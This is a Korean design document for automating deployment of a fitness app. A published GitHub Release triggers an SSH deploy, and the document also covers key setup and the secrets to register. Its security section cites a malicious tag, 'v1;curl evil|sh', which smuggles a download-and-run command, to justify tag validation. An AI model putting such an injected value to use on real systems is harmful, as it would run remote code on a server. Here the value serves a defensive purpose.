# 배포 자동화 (GitHub Release 트리거 + SSH 키)

- **작성일**: 2026-06-30
- **타입**: chore (운영)
- **이슈**: #137

## 1. 배경

2026-06-29 모닝/이브닝 cron 리포트 실패 진단 결과, 운영 main이 118 커밋 stale (사용자가 매 릴리즈마다 ssh + pull + build + restart 수동 진행을 누락). 코드 ↔ dist 어긋남 → AI 가 신규 MCP 도구 못 찾아 Bash 우회 → max_turns 실패. 매 릴리즈마다 같은 위험 재발 가능 → 자동화 필요.

## 2. 의사결정

| 항목 | 채택 | 사유 |
|---|---|---|
| 트리거 | **GitHub Release published** | dev 머지마다 배포하면 과함. 의도된 릴리즈만 배포. 태그 + Release 노트 작성이 자연스러운 gate. |
| 접속 방식 | **GitHub Actions + SSH 키** | self-hosted runner는 운영 부담 추가. tunnel은 인프라 복잡. SSH 키 1개 발급이 가장 단순. |
| SSH action | **appleboy/ssh-action@v1.2.2** | 4k+ stars, 표준. raw ssh는 길고 fragile. |
| 명령 | **`./deploy/deploy.sh <tag>`** | 기존 deploy.sh 그대로 활용 (이미 git fetch/checkout/migrate/build/pm2 처리). |

## 3. 요구사항

- [ ] **F1**: `.github/workflows/deploy.yml` 신규. `on: release: types: [published]`.
- [ ] **F2**: SSH 로 운영 서버 접속 → `deploy/deploy.sh <release.tag_name>` 실행.
- [ ] **F3**: secrets 5종 사용 (`DEPLOY_SSH_HOST`/`DEPLOY_SSH_USER`/`DEPLOY_SSH_KEY`/`DEPLOY_SSH_PORT`/`DEPLOY_PATH`).
- [ ] **F4**: `command_timeout: 30m` — npm ci + build + pm2 restart 충분.
- [ ] **F5**: 워크플로우 실패 시 GitHub Actions UI 에서 로그 확인 가능.

## 4. 기술 설계

### 4.1 워크플로우 (`.github/workflows/deploy.yml`)

핵심 보안 가드 (Codex 리뷰 반영):
- **`if:` prerelease/draft 차단** — prerelease 가 운영 배포되지 않음
- **태그 env var 경유 + semver 정규식 검증** — `${{ release.tag_name }}` 가 remote shell에 직접 expand되면 악성 태그 (`v1;curl evil|sh`) 가 명령 실행 가능. env var로 받아 quoted 사용 + 형식 검증으로 차단.
- **`set -euo pipefail`** — 명령 실패 즉시 중단, 정의 안 된 변수 사용 차단

실제 구현은 `.github/workflows/deploy.yml` 참조 (44줄).

### 4.2 SSH 키 발급 절차 (운영자 1회)

운영 서버에서:

```bash
# 1) deploy 전용 키 발급 (passphrase 없음 — Actions 비대화)
ssh-keygen -t ed25519 -f ~/.ssh/myfitness_deploy -N "" -C "github-actions-deploy"

# 2) public key를 authorized_keys에 추가
cat ~/.ssh/myfitness_deploy.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# 3) private key 내용 확인 (GitHub Secrets에 복사)
cat ~/.ssh/myfitness_deploy
```

### 4.3 GitHub Secrets 등록

Repo Settings → Secrets and variables → Actions → New repository secret:

| 이름 | 값 |
|---|---|
| `DEPLOY_SSH_HOST` | 운영 서버 호스트 (도메인 또는 공인 IP) |
| `DEPLOY_SSH_USER` | `nasty68` |
| `DEPLOY_SSH_KEY` | 위 4.2 의 `cat ~/.ssh/myfitness_deploy` 내용 전체 (BEGIN/END 포함) |
| `DEPLOY_SSH_PORT` | `22` (다르면 해당 값) |
| `DEPLOY_PATH` | `/home/nasty68/myFitness` |

### 4.4 동작 흐름

1. 사용자가 dev → main PR 머지
2. 로컬에서 `git tag vX.Y.Z <main-sha> && git push origin vX.Y.Z`
3. 사용자가 `gh release create vX.Y.Z --notes "..."` (또는 GitHub UI)
4. **release.published 이벤트 발생 → 워크플로우 자동 트리거**
5. GitHub-hosted runner가 SSH로 운영 서버 접속
6. `./deploy/deploy.sh vX.Y.Z` 실행 (기존 스크립트)
7. 성공/실패가 Actions UI 에 표시

## 5. 검증 계획

- 워크플로우 syntax: GitHub Actions 가 push 시 자동 검증
- 첫 release 시 Actions 탭에서 실행 로그 확인
- 운영 적용 후 PM2 상태 정상 확인 (`pm2 status`)

## 6. 보안 고려

- SSH 키는 **deploy 전용** — 다른 권한 X (운영자 일반 ssh와 분리)
- private key 는 GitHub Secrets 에만 저장, 코드에 없음
- 워크플로우 권한 `contents: read` 최소화
- third-party action `appleboy/ssh-action` 은 4k+ stars 신뢰 가능. 보안 우려 시 raw ssh 명령으로 대체 가능.

## 7. 제외 사항

- dev 머지 자동 배포 — release publish 만 트리거. dev 환경은 별도 (운영 서버는 main 전용).
- Slack/Telegram 배포 알림 — 별도 백로그.
- 롤백 자동화 — 수동 (`./deploy/deploy.sh v이전버전`).

## 8. 롤백 (자동화 자체)

`git revert <merge-sha>` 후 머지 — 워크플로우 파일 제거. secrets는 그대로 두고 향후 재사용 가능.
